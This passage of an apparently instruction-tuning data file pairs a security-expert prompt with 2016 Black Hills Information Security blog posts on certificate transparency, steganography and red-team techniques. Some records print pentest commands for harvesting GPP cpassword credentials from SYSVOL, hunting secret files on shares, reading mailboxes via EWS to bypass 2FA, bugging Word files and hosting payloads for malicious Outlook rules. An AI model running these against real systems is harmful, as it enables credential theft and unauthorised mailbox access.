below Third-Party Command Shells As a pentester you may be prevented from running cmd.exe but you have other options You could try running a third-party command shell There are several out there but we have tested only one and it worked perfectly It is a command shell that comes with the open-source Windows-like operating system ReactOS In the case that AppLocker rules prevent execution of the third-party shell convert the executable to a DLL and use the RunDLL32.exe method described above You can also download an already converted cmd.dll using the link to a post by Didier Stevens in the references References PowerShell without PowerShell ww.blackhillsinfosec.com ?p 5257 App Whitelisting Bypass ubt0x10.blogspot.com 2016 04 bypass-application-whitelisting-script.html Open Source Windows-like OS ww.reactos.org Open Source Windows-like OS n.wikipedia.org wiki ReactOS How to convert EXE to DLL log.didierstevens.com 2010 02 04 cmd-dll Privilege Escalation There are many great tools that we use all the time to help with privilege escalation within a Windows domain GPP Group Policy Preferences was introduced by Microsoft in 2008 One of the things often found in GPP preference files are encrypted privileged credentials in order to script administrative tasks This became a problem because the static symmetric AES encryption key used for the password was published so credentials found in the files can be easily decrypted These credentials are definitely what we consider low hanging fruit and are one of the first things we check for on a pentest Here is how simple it is Open up a command shell and run the following command C findstr S cpassword logonserver sysvol .xml If you get any hits that contain an encrypted looking value in the cpassword property item just decrypt it to reveal the cleartext password and try using the credentials Use gpp-decrypt.rb to decrypt You could also use the PowerSploit module Get-GPPPassword or the Metasploit module gpp to find and decrypt in one shot References logs.technet.microsoft.com grouppolicy 2009 04 22 passwords-in-group-policy-preferences-updated ools.kali.org password-attacks gpp-decrypt ithub.com PowerShellMafia PowerSploit blob master Exfiltration Get-GPPPassword.ps1 ww.rapid7.com db modules post windows gather credentials gpp PowerUp will find common misconfigurations that could allow privilege escalation This PowerShell script will check for misconfigurations like Weak Service Permissions Unquoted Service Paths Hijackable DLLs and other things We show how to run the PowerUp module in PowerShell here but PowerShell Empire also has the module builtin so when you establish an agent using Empire you can invoke it remotely PS C import-module powerup.ps1 PS C Invoke-Allchecks The use one of the builtin modules in PowerUp to exploit any discovered vulnerabilities Use ShareFinder and FileFinder modules in PowerSploit's PowerView module to scour the domain looking for juicy files that you have access to By default FileFinder will flag files that files with 'pass 'sensitive 'secret 'admin 'login or 'unattend .xml in the name but search criteria is configurable PS C Invoke-ShareFinder -CheckShareAccess -Verbose -Threads 20 Out-File -Encoding Ascii interesting-shares.txt PS C Invoke-FileFinder -ShareList interesting-shares.txt -Verbose -Threads 20 -OutFile juicy_files.csv Bloodhound is a tool that automates the process of finding a path to an elevated AD account It uses PowerShell to query Active Directory and then creates a graph showing the available accounts computers that the attacker can gain access to in order to dump credentials from memory for example with Mimikatz The dumped credentials will provide privilege escalation perhaps all the way up to domain administrator Restricting Client to Client Traffic We have only worked with a couple of organizations that implement this level of control and it was very effective in restricting our ability to pivot Unfortunately we do not have many references to offer regarding how to implement this level of security but it is reasonable to assume that granular NTFS permissions and host-based firewall rules are part of the recipe W X Refers to only allowing users to write in locations that are not executable and only allow applications to be executed in locations where they are not allowed to write The latter can be enforced with AppLocker In fact default AppLocker rules allow execution only from the Program Files directory and the Windows directory which users by default do not have write access to It would be worth auditing those locations for any permission changes when implementing AppLocker References PowerUp ithub.com PowerShellMafia PowerSploit tree master Privesc PowerView ithub.com PowerShellMafia PowerSploit tree master Recon Empire ithub.com adaptivethreat Empire Bloodhound ww.youtube.com watch?v MYxk73DsGQI Bloodhound ald0.com ?p 68 Mimikatz ww.blackhillsinfosec.com ?p 4667 LAPS echnet.microsoft.com en-us mt227395.aspx Active Defense This refers to making the attacker's job more difficult and confusing It does not refer to hacking back Hacking back by most definitions would be illegal Injecting a little bit of chaos and unpredictability goes a long way to confounding and slowing down attackers Most people have heard of honeypots but what about honey files honey accounts honey tokens and other lovely goodies ADHD is an active defense distribution put together by BHIS and available for free here Web Bugs are hidden elements in a web page like a 1X1 pixel image that gets loaded from a web bug server The server collects identifying information like IP address User Agent and Timestamp The web bug can be embedded in a .DOC file with a juicy sounding file name like ProjectedSalaries-2017.doc or Passwords.doc When the attacker takes the bait the identifying info is logged Weblabyrinth creates a maze of fake web pages with the goal of confusing automated web scanners Use Honeyports to catch and blackhole attackers when they try to connect to the fake services listening on the network with the tool Artillery by TrustedSec Use Kippo to monitor brute force SSH attacks and confuse the attackers by making it appear that they are really connected to an SSH server And many more in ADHD References List of Tools in ADHD ithub.com adhdproject adhdproject.github.io blob master index.md About ADHD ww.blackhillsinfosec.com ?page_id 4419 ADHD Install instructions ww.blackhillsinfosec.com ?p 5234 Artillery ww.trustedsec.com artillery Web Bugs ithub.com adhdproject adhdproject.github.io blob master Tools WebBugServer.md Weblabyrinth ithub.com adhdproject adhdproject.github.io blob master Tools Weblabyrinth.md Honeyports ithub.com adhdproject adhdproject.github.io blob master Tools HoneyPorts.md Kippo ithub.com adhdproject adhdproject.github.io blob master Tools Kippo.md"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Certificate Transparency Means What, Again?</title>\n<taxonomies>Author, Brian King, InfoSec 301, Bad Certificates, Certificate Transparency, Chrome, Google</taxonomies>\n<creation_date>Fri, 28 Oct 2016 15:06:17 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian King News from Google this week says that Chrome will start enforcing Certificate Transparency a year from now roups.google.com a chromium.org forum !topic ct-policy 78N3SMcqUGw This means that when Chrome contacts a website if it finds that the certificate does not adhere to Transparency requirements Chrome won't load the page They're announcing it now so interested parties can comment and possibly influence the details of how that will work in practice So what is Certificate Transparency and why should you care Certificate Transparency is a way to detect Bad Certificates A Bad Certificate is one that was issued incorrectly in some way but is not a forgery Our existing public-key cryptography and trusted CA stores in your browser already detect forgeries as well as signatures that can't be validated That's what triggers the familiar certificate warning in your web browser In this other sense a Bad Certificate is one that was issued without the CA's valid assent or without having properly verified that the requestor had authority to act on behalf of the domain name in question Root causes for these kinds of problems include forged identity documents hijacked verification steps compromised root certificates malicious insiders and rouge or misbehaving certificate authorities Certificate Transparency is accomplished through the use of independent cryptographically-verifiable append-only logs that provide information about certificates Anyone can submit a certificate to these logs and anyone can query them to see if a particular certificate is in there There will be lots of these log servers independently operated Certificate Authorities will likely run their own and auto-submit their certificates as they issue them but anyone can run one Google's announcement means that Chrome will complain in some fashion if it gets a certificate from a website and cannot find that certificate properly registered in one of these logs Monitoring services will keep an eye on these log servers These will look for certificates that are wrong in some way Maybe a server certificate that has the CA bit set and so can sign other certificates Maybe a certificate is signed by a legitimate CA's root certificate but was not actually issued by that CA This is one reason a CA would run their own log server if they see a certificate signed with their keys appear in someone else's log server but not their own it's time to hit the panic button someone has misused their signing keys Auditing services will make sure that the log is functioning properly at an administrative level They will verify that the log hasn't been tampered with for example by verifying the cryptographic signatures These will also lookup individual certificates to see if they exist in a given log Your browser will have a built-in limited purpose auditor It seems likely that all three of these roles will be carried out by certificate authorities browser vendors academics and researchers This is a giant leap towards independent verification of SSL TLS security and provides a strong supplement to the blind trust we all implicitly grant to the long long list of certificate authorities built into our browsers If you operate a web site or any service secured by certificates go learn more ww.certificate-transparency.org This all came to my attention in the Feisty Duck newsletter that Ivan Risti\u0107 publishes a fantastic place to keep up with SSL TLS issues"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Happy Halloween from BHIS</title>\n<taxonomies>Fun & Games, happy halloween</taxonomies>\n<creation_date>Mon, 31 Oct 2016 17:24:47 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Melisa Wachs Everyone seems to hates clowns these days With all the crazy clown sightings and banning of clown costumes at parades and schools I got to thinking that this whole scary clown thing is way overdone That was until I remembered why I too hate clowns Feeling mischievous this Halloween I decided to have some fun with family ....And by family I mean John I thought I might share a gem from the Strand hutch I dug up this summer Meet John Strand Maybe the Last Lonely Innocent Clown __________ P.S I hope you enjoy because I'm actually going to be in serious trouble for this one John's going to be pissed Here's one for all the times I had to endure the not touching you game on car trips"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Steganography: The Art and Science of Hiding Things in Other Things  Part 3</title>\n<taxonomies>How-To, compression, hiding, jpg, puppies, steganography</taxonomies>\n<creation_date>Fri, 04 Nov 2016 15:00:05 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dakota Nelson This is part three of a four part series In part 1 we covered the basics of image formats and found a place to hide data in images In part 2 we actually wrote code to steganographically encode data into an image and then extract it without making the image look different Tired of this picture yet We ran into a problem in part 2 though compression When images are compressed our carefully hidden data can be damaged We fixed that by repeating every bit in the message 9 times but we can do better This post will cover how we can use some math in the form of error correcting codes to hide more bits of data in each image Our friend Wikipedia gives us a good definition of what an error correcting code is An error-correcting code ECC is a process of adding redundant data to a message such that it can be recovered by a receiver even when a number of errors up to the capability of the code being used were introduced The repetition we used earlier is the simplest possible ECC we send redundant data repeating ourselves over and over so that even if some of the bits are wrong we can still receive the message Before we start figuring out something better though we need to define our problem We know that compression destroys data but how Firstly we can say that compression introduces noise in other words some bits are not what we expect them to be For instance we might put the message 1101 in and get 1100 out in which case we would say that the last bit was flipped from a 1 to a 0 Now that we know we have some noise how can we define it Well we have several options here You can read papers like this 8 page one src.nist.gov nissc 1996 papers NISSC96 paper014 STEGOX.PDF written by someone at the Fleet Information Warfare Center or you can make some assumptions and see if they work Let's compromise and make some assumptions that are informed by reality They might not be 100 right but they're right enough So for our sake we can assume 1 Random position-independent noise there are no specific patterns in the noise any given bit has the same chance of being flipped as any other bit of the same significance This means it doesn't matter where in the image we encode data a pixel in the bottom left hand corner of the image for example is as likely to be changed as a pixel in the middle 2 More significant bits have less noise the least significant bit of any pixel is the most likely to be flipped since compression tries to eliminate useless data and the chance that a bit will be flipped decreases as the bits become more significant 3 The noise is binary symmetric this is a fancy way of saying that the noise is unbiased and evenly distributed a zero is just as likely to be flipped as a one Rather than spend a lot of time uploading and downloading images from web sites where they'll be compressed we can simulate this type of noise by randomizing some bits in the image This lets us use code which is nice and controllable so we can do lots of testing easily Here's our image before and after blurring It may not look very different but it turned we're going to hide this message in an image into we're eking to hide this message in an image without the exclamation point on the end so it's definitely causing some damage The challenge now is to be able to extract data from the blurred image even though there's noise The repetition from part 2 works but having to repeat every bit 9 times means we can't transfer nearly enough data We can do better Before we can dive into error correction though we need to talk about parity bits Essentially a parity bit adds a check to any given binary string that tells us whether the number of 1-bits in the string is odd For instance the string 000 has no 1-bits so its parity bit would be 0 leaving us with the final string 0000 In contrast the string 010 has an odd number of 1-bits so its parity bit is 1 leaving us with 0101 You'll notice that this means every string has an even number of ones in it once the parity bit is added The process is 1 Compute parity bits based on your message If it has an odd number of 1 values the parity bit is 1 otherwise the parity bit is 0 2 Put those parity bits into the message they're frequently on the end but it doesn't actually matter where they are so long as the receiver knows where to find them Why do we do this Simple if a bit gets flipped somewhere in the string we can tell something is wrong by checking the parity bit if the string 0101 from above comes across as 1101 we know that the parity bit of 110 should be 0 but it's 1 so something must be wrong Unfortunately this only tells us that something is wrong not what We have no way of knowing which bit was flipped Enter Richard Hamming who invented Hamming codes a way of combining parity bits to both detect and correct errors Hold on this is about to get awesome and really math-y For this next part let's assume you're trying to send 4 bits of data and you know somehow that you won't have more than one error in them Say you've got your usual parity bit with the 4 bits of data If there's an error how can you tell which bit is wrong You can't one of the four is flipped but there's no way to know which Note that the circles in these graphics each represent a parity group once all the parity bits are computed and added each will have an even number of ones in it This means that if a circle doesn't have an even number of ones in it when we receive the message we know something is wrong If you just add another parity bit that's great but all you've done is repeated the parity bit which is useful since it means you can maybe tell if either of them is wrong by checking the other But this mostly seems like a waste You still can't tell which data bits have been flipped if anything goes wrong the second parity bit provides no new information Let's try something weird What if you exclude the 4th data bit from the first parity bit If either of the first three data bits are flipped the first parity bit will tell us and if any of them are flipped the second parity bit will tell us as usual but if the first parity bit is wrong it can be any of the first three data bits that are wrong but if the second parity bit is wrong it can be any of the four Seems like we're kind of narrowing in on something here If we take this one step further and keep shrinking the number of bits covered by the first parity bit we get to the layout below We've done an incredible thing here If both parity bits are wrong we know that the first data bit is wrong not just a bit but exactly which bit is wrong If you take this further you can end up here Seriously take a minute to look at the image above This means that if any one of the data bits is flipped you can tell which it is and fix it because you know that each circle must contain an even number of ones By extending this idea you can play with the number of parity bits and data bits to handle different levels of error broadly speaking more parity bits help you correct more errors but it means you have less space for data If error correcting codes are still confusing think of it this way we've created a bunch of potential messages which are invalid to receive so that if you get them you know something is wrong the valid messages are known as code words the code in error correcting codes When you get one of these messages that you know is wrong you can correct for errors by choosing the valid code word that is most similar to what you received which means we want code words to be as different as possible so that it's obvious which code word any given incorrect message is supposed to be This is the math behind correcting errors in a much more efficient way than the simple repetition we've used before in our case we can fit more than four times the amount of data Next time we'll take this math and put it to work ________ Dakota runs Striker Security you can find more of his writing at trikersecurity.com blog"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bypassing Two-Factor Authentication on OWA & Office365 Portals</title>\n<taxonomies>Author, Beau Bullock, External/Internal, Red Team, 2FA, Beau Bullock, Email, EWS, MailSniper, Microsoft, Outlook, OWA, OWA portal, Vulnerabilities</taxonomies>\n<creation_date>Wed, 02 Nov 2016 15:00:10 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Beau Bullock Full Disclosure Black Hills Information Security believes in responsible disclosure of vulnerabilities This vulnerability was reported to Microsoft on September 28th 2016 As of the publication date of this post November 2nd 2016 Microsoft have not responded with any updates other than to say there are no updates The full timeline of this disclosure can be found in a section at the end of the blog post UPDATE as of 3pm MST 11 2 16 This blog post demonstrates a two-factor authentication bypass technique against Microsoft Outlook Web Access where the third-party 2FA vendor was DUO Security It should be stated that this is NOT a vulnerability in DUO Security's product It is a problem in which Microsoft Exchange server exposes the Exchange Web Services interface unprotected by 2FA alongside OWA UPDATE as of 11 15am EST on 11 4 16 BHIS has retested the portion of this article detailing a bypass against Office365 Multi-Factor Authentication and it does indeed appear to not work Some individuals have pointed out that they were getting 401 Unauthorized error messages when connecting in via EWS with MFA fully enabled on a user When testing against the initial test user BHIS tested against EWS on O365 it now produces the same 401 error results when using a password to authenticate BHIS believes that the results obtained previously were due to a delay in which Office365 MFA was denying access to Exchange Web Services after recently enabling it for a user A video demonstrating this has been put together here outu.be Bb_T3ILfllU Additionally a very detailed post regarding the various protocols of Exchange has been put together here xchangeserverpro.com exchange-web-services-bypass-multi-factor-authentication _______ ORIGINAL POST At DerbyCon 6.0 I released a tool called MailSniper for searching mailboxes for sensitive data in a Microsoft Exchange environment MailSniper utilizes Exchange Web Services EWS when connecting to an Exchange server to retrieve messages from a user's inbox EWS is a web-based API enabled on Exchange servers that Microsoft recommends customers use when developing client applications that need to interface with Exchange The API allows for applications to have the ability to interact with email messages contacts calendar and more from user's mailboxes While at DerbyCon I sat in on a talk called Outlook Exchange for the Bad Guys by Nick Landers It was an awesome talk that I highly recommend checking out During his talk Nick received a question from the audience in regards to whether two-factor authentication 2FA would stop the attacks he mentioned during the talk Nick replied with a statement I found very interesting He said I've seen some organizations lockdown 2FA on OWA So when you go to the Outlook Web Access you have to supply a token before you can finish logging in That wouldn't stop a lot of these attacks because two-factor auth doesn't apply to EWS or the NTLM auth on the Autodiscover page I thought to myself if 2FA on OWA doesn't apply to EWS then it should be possible to read emails using EWS with MailSniper completely bypassing the 2FA security control To test this theory I set up an Internet-facing Outlook Web Access portal and installed a popular 2FA software DUO for Outlook on it I setup the DUO mobile application on my phone and logged into our OWA portal using a test user account called 'vladi eldershogun.com Standard OWA Login Page After syncing DUO with my phone I could now receive push notifications upon logging in to confirm my second factor during authentication At this step if I was a remote attacker and did not have the phone synced with the DUO 2FA software I could not proceed any further with logging into the OWA portal DUO 2FA Screen Previously with MailSniper it was only setup to work on an internal domain I modified the code slightly to add in a -Remote switch that will allow the Invoke-SelfSearch function to work remotely across the Internet A few things are needed in order to access a mailbox remotely First an external email server for the target organization needs to be located In many cases these can be discovered using Autodiscover or by brute forcing subdomains like mail.domain.com owa.domain.com webmail.domain.com etc The mail server needs to be specified with the '-ExchHostname option If no '-ExchHostname option is specified Invoke-SelfSearch will attempt to Autodiscover the mail server Secondly a valid set of user credentials must be gathered For some ideas on doing this remotely see this blog post Once the Exchange server hostname and credentials of the target user are obtained the following command can be used to search an exchange mailbox remotely over the Internet Invoke-SelfSearch -Mailbox email domain.com -ExchHostname mail.domain.com -Remote Once this command is run a credential box will pop up requesting the credentials of the target user Depending on how the organization setup internal User Principal Names UPN's the target user's email address or domain username can be entered into the username box After the credentials have been entered MailSniper will attempt to connect to the EWS URL at ail.domain.com EWS Exchange.asmx and search the user's inbox for key terms by default pass creds and credentials I tested this against the account that was setup to be protected by DUO 2FA MailSniper was able to successfully read and search through emails of this account completely bypassing the two-factor protection To further validate that this is not simply a problem with the DUO 2FA software BHIS set up an Office365 instance and utilized Microsoft's own Azure Multi-Factor Authentication MFA to protect a user account from accessing the Outlook Mail portion of Office365 To demonstrate this I first logged in to my test user's account at the standard Office365 login portal After entering the correct password the additional Microsoft Azure Multi-Factor authentication portion is necessary In this case I had it send me a text message to deliver the verification code After the MFA verification code has been entered the test user was now able to access the inbox at Outlook.Office.com Using the method described previously to bypass 2FA it is still possible to read emails of the allegedly protected account through Exchange Web Services By directing MailSniper to authenticate to outlook.office365.com as the ExchHostname the mailbox of the target user can still be accessed bypassing the two-factor protection Demo Video Recommendations I wish the easy answer for fixing this would be disabling Exchange Web Services but that could break many things For example from what I can tell Outlook for Mac utilizes Exchange Web Services exclusively to connect to Exchange So if you have Macs in your environment disabling EWS probably isn't an option The same would go for any custom apps that utilize it So in the short term lockdown OWA to only be accessed from an internal network and require users VPN in to access it It appears that it is possible to lockdown Exchange Web Services manually for specific user accounts or even for the entire organization But keep in mind any users that are using applications that utilize Exchange Web Services to connect to Exchange will likely break Conclusion In conclusion it appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange In this post it was demonstrated that Exchange Web Services is not being protected by a popular two-factor authentication software and it was possible to still read emails of a user after only obtaining their login credentials Exchange has other services that might have a similar problem such as MAPI over HTTP and Autodiscover I tested against one third-party 2FA software and Microsoft's own Azure Multi-Factor authentication but I'd imagine others likely have the same problem Timeline of Disclosure September 28 2016 at 1 51 PM Eastern Reported it to Microsoft via secure microsoft.com September 28 2016 at 10 01 PM Eastern Received confirmation email from Microsoft that they forwarded the report to an analyst Hello Thank you for contacting the Microsoft Security Response Center MSRC I have forwarded your report to an analyst and will respond with their findings Thank you REDACTED MSRC October 3 2016 at 11 15 AM Eastern Sent a follow up email requesting status October 3 2016 at 7 41 PM Eastern Received email saying they've opened a case Thank you very much for your report I have opened case 35494 and the case manager REDACTED will be in touch when there is more information In the meantime we ask you respect our coordinated vulnerability disclosure guidelines and not report this publicly until users have an opportunity to protect themselves You can review our bulletin acknowledgment policy at ww.microsoft.com technet security bulletin policy.mspx and our general policies and practices at ww.microsoft.com security msrc default.mspx If at any time you have questions or more information please respond to this message REDACTED MSRC October 11 2016 at 8 55 AM Eastern Sent a follow up email requesting status October 11 2016 at 4 07 PM Eastern Received email saying they are still waiting on the product team to review the issue Hello We are still waiting on the product team to review the issue I will let you know when I hear back from them and have information I can share Thanks REDACTED MSRC October 21 2016 at 3 37 PM Eastern Sent a follow up email requesting status October 24 2016 at 4 46 PM Eastern Received email saying still no updates Hello At this time I still do not have anything fruitful to share As soon as I get an update I will let you know Thanks REDACTED MSRC November 2 2016 Disclosed publicly on the Black Hills Information Security blog"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Bugging Microsoft Files: Part 1 - Docx Files using Microsoft Word</title>\n<taxonomies>Author, Ethan Robish, Red Team, Red Team Tools, ADHD, Bugging Word Files, Microsoft, MS Word, Pentesting, Web Word Bugs, Word</taxonomies>\n<creation_date>Mon, 07 Nov 2016 15:16:32 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ethan Robish If you're familiar with ADHD and Web Word Bugs you likely already know the method to create web tracking software using .html files renamed as .doc files This works but you also likely know that it makes it difficult to use existing documents especially if you want to update the documents in the future In this post I'm going to share a method that works with native .docx files It can be used with a new document or an existing one I thought this would be good timing considering Jordan recently mentioned the risks of opening Office documents in his post The instructions below were made with Microsoft Word 2013 for Windows Open an existing document or create a new one Place the cursor where you want to insert the tracker You can place it anywhere but I recommend using the header or footer as it is less likely to be accidentally changed if inserting fake content in the document later on Choose the Insert Menu Choose Quick Parts Choose Field This will open a dialog window where you can choose a field Choose IncludePicture Type the address for your tracking bug You should come up with a unique name for this document so when it is opened later you can tell which document it was The address should be similar to OMAIN index.php?id ID type img but you need to replace DOMAIN and ID with your own values Check the box labeled Data not stored with document This tells Word to request the image every time the document is opened Choose OK You can resize the image by selecting it and dragging the corner down Smaller Image Not Loaded By making it as small as possible it is barely noticeable Smallest Image Not Loaded Save the file and close Word In my next posts I will cover weaponizing .xlsx files and removing metadata from Office files afterwards Part 2 Part 3 References uperuser.com questions 38870 in-microsoft-word-how-can-i-link-to-an-image-from-the-web-which-updates ww.youtube.com watch?v a-b6uyDL1Rg"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Deploying a WebDAV Server</title>\n<taxonomies>Red Team, Red Team Tools, Digital Ocean, Outlook, OWA, webDAV</taxonomies>\n<creation_date>Wed, 09 Nov 2016 20:41:12 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts There are various reasons why having a webDAV server comes in handy The main reason I created one was to execute a malicious Outlook rule attack as part of a pentest as described here In my case I configured the webDAV server to be read-only so that my executables do not get erroneously or maliciously overwritten These instructions are for deploying a webDAV server on a Digital Ocean instance but similar steps would be used for other cloud providers Here we go Create and then sign into your Digital Ocean account at ww.digitalocean.com For improved security enable two-factor authentication on your account Click on the Create Droplet button at the top of the page Click Create Droplet in Digital Ocean Choose the default Ubuntu release at the time of writing this was 16.04.1 and the cheapest server option as shown in the images below Accept other defaults and add your SSH key for logging into your new server Optionally set a hostname for your server Finally click the big green Create button at the bottom of the page to create your instance Digital Ocean Droplet Creation Options That was easy Now you have a server deployed on the internet Successfully Created Digital Ocean Instance aka Droplet First let's do some housekeeping on our new instance Connect to your new instance like so SSH Access to Server Disable the ability to SSH to your server using a password so that SSH access requires your private key Edit the file at etc ssh sshd_config by uncommenting the PasswordAuthentication line and setting the value to no Disable SSH Access via Password Then restart the SSH service so that your changes take effect SSH Configuration Edit and Service Restart You can verify that SSH access via password has been disabled by trying to SSH from a server that does not have your private key as shown below The first attempt was made before the configuration change and prompts the user to enter their password The second attempt simply denies the user access Confirm SSH Key Access Only Update your server with the following two commands repeat this often to keep the system up to date apt-get update apt-get dist-upgrade Install Apache with the following command apt-get install apache2 Enable Apache webDAV functionality a2enmod dav a2enmod dav_fs Enable Apache WebDAV Modules Create a webdav directory at var www and set www-data as the owner Create WebDAV Directory and Set Owner Configure Apache for read-only access to files in the webdav directory by editing your etc apache2 sites-available 000-default.conf file to match the following comments removed for brevity 80 ServerAdmin webmaster localhost DocumentRoot var www html ErrorLog APACHE_LOG_DIR error.log CustomLog APACHE_LOG_DIR access.log combined Alias webdav var www webdav webdav Options Indexes DAV On GET HEAD OPTIONS PROPFIND Deny from all Satisfy all Restart Apache and visit your new webDAV server from a web browser at http webdav Command to Restart Apache Initial WebDAV Directory Listing Congratulations you now have a webDAV server Now put some files in there you would like to access A simple example is given below Refresh your web browser to see the file listing WebDAV Directory Listing and File Access The interesting thing about a webDAV server is that you can access the files from File Explorer by entering the network address as follows 159.203.131.191 webdav Access WebDAV Files Through Windows File Explorer Be patient as it takes a bit of time to load the directory listing after entering the network address Attempting to open one of these files from the File Explorer gives the following error File Permission Error Blocks File Open This is due to a file permission error because file ownership belongs to root instead of the www-data user under which Apache runs Test Files Owned by Root Causes Permission Error To fix the permission issue change the ownership of the files as shown below Test File Ownership Changed to www-data The test file can now be opened by clicking on the link in File Explorer Test File Opened from WebDAV Server via File Explorer Forgetting to properly set the file permissions will foil your malicious Outlook rule attempt The image below shows an example of the pop-up the user will get when the Outlook rule attempts to fire when the permissions on the WebDAV server are not correct Outlook Rule Error with Incorrect File Permission on WebDAV Server In addition your Malicious Outlook Rule will be automatically disabled as indicated by the red text and no check mark in the check box Automatically Disabled Rule on Error"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Steganography: The Art and Science of Hiding Things in Other Things  Part 4</title>\n<taxonomies>How-To, hiding things in other things, images, steganography</taxonomies>\n<creation_date>Fri, 11 Nov 2016 16:07:34 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Dakota Nelson Part 4 Resilient Steganography This is it The end The last of a four part series covering image steganography You can get started with part 1 part 2 or part 3 or dive right in below We've covered the basics of hiding data in images We've covered the math We've covered error detection and correction using hamming codes There have been Venn diagrams and puppies and secret messages and it's all been very exciting Where do we end With code of course We'll tie everything together slap a nice bow on it write some documentation and declare our steganography project complete I left you after part 3 with a bunch of math about error correcting codes and a promise to put that math to work and that's exactly what we'll do steganographically hide data which we've run through a hamming encoder so that we can correct errors caused by compression or anything else All of the code for this article can be found on Github I'll walk you through it below but you can always go take a look for yourself Let's get started When you read part 2 we covered the Python code used to steganographically insert data into images The final steganography software in Python which does this is the same as before except slightly cleaned up so I'll skip over a full explanation of it As a refresher the least significant bits of each pixel in the image are basically random so we can change them to whatever we want and the image will look the same to a human observer This code just flips the correct bits in order to output an image with our message in it What happens though if the image is then compressed or damaged in some way In the last post we walked through the math behind hamming codes an error-correcting code that allows us to fix errors in our message Here's the code that puts that math into action def encode msg passed a list of bits integers 1 or 0 returns a hamming 8 4 -coded list of bits while len msg 4 0 pad the message to length msg.append 0 msg np.reshape np.array msg -1 4 create parity bits using transition matrix transition np.mat '1 0 0 0 0 1 1 1 0 1 0 0 1 0 1 1 0 0 1 0 1 1 0 1 0 0 0 1 1 1 1 0 result np.dot msg transition mod 2 the matrix multiplication return np.mod result 2 This is some pretty dense code so let's walk through it one piece at a time First we add zeros to the end of the message until it's the proper length so that the matrix multiplication will work out right the number of bits in the message must be a multiple of 4 Once the message is the right length we create an nx4 array of the message's bits where n is whatever it has to be to fit the whole message This array is then multiplied by a transition matrix Hold up Matrices you say where did they come from We haven't talked about any stinkin matrices Well astute reader you caught me I didn't mention the matrices and I'm going to mostly ignore them here except to say this remember when we had to count up the number of bits in each circle of the Venn diagram and then create a parity bit for each group based on what the data bits were That's what this matrix does We multiply the message by this hamming code matrix then mod the result by two that is take the remainder of each entry in the resulting array divided by 2 and we have ourselves a hamming-encoded message If you still don't like me not explaining the matrix multiplication here's the mathy version the left half of the matrix is the identity matrix preserving our original message while the right half's columns are entirely linearly independent from each other such that every generated parity bit is based on 3 data bits with no redundancy in parity Given 4 bits of data this matrix outputs 8 bits of data plus parity known to error correcting code people as a codeword Now that we've got a hamming-encoded message that will tolerate some errors we insert it into an image as usual exactly how we've discussed in previous posts We then extract it on the other end again as usual The mechanics of actual steganography should be pretty familiar to you by now If not go back and read part 2 for a discussion of image steganography techniques Once we've retrieved our message from the image that our steganography algorithm put it into how do we fix 